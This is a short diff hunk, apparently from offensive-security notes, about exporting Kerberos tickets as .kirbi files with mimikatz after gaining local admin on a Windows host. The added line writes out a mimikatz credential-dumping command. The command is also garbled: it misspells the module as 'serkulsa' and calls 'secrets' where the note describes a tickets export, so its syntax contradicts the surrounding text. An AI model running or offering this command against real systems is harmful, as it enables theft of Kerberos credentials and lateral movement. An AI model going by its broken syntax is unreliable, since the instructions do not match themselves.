@@ -5,5 +5,5 @@ Assuming we compromised an acc with local admin privs
 - Admin user -> every ticket
 `serkulsa::tickets` module using the `/export` function resulting in `.kirbi` files -> tickets
 ```powershell
-mimikatz.exe privilege::debug "" exit
+mimikatz.exe privilege::debug "serkulsa::secrets /export" exit
 ```
